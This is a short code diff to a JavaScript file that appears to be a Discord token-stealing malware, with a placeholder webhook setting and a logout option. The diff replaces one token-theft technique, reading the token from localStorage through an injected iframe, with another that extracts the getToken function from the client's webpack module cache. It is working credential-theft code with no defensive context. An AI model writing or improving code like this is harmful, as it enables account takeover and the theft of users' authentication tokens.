@@ -6,8 +6,7 @@ const axios = require('axios');
 const buf_replace = require('buffer-replace');
 const dawebhook = "%WEBHOUK%1"
 
-const FnLComa = /^"|"$/g;
-const token = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token.replace(FnLComa, '')
+const token = Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken()
 
 const config = {
     "logout": "%LOGOUT%1",
